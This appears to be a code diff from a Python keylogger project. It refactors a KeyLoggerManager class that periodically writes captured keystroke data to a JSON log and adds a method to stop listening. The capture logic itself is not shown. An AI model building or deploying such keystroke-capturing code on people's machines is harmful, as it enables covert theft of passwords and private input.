@@ -1,9 +1,9 @@
 import time
-from KeyloggerService import KeyLoggerService
-from FileWrite import FileWriter
+from KeyloggerService import KeyLoggerService, Logger
+from KeyloggerAgent.FileWrite import FileWriter
 
 
-class KeyLoggerManager:
+class KeyLoggerManager(Logger):
 
     def __init__(self):
         self.service = KeyLoggerService()
@@ -19,6 +19,12 @@ class KeyLoggerManager:
         while True:
             time.sleep(30)
             self._write_to_file(self.service.get_data(),'log.json')
+    def stop_listening(self):
+        """
+         Stops listening to keyboard keys
+        :return:
+        """
+        self.service.stop_listening()
 
     def _write_to_file(self,data:dict, file_name:str):
         """
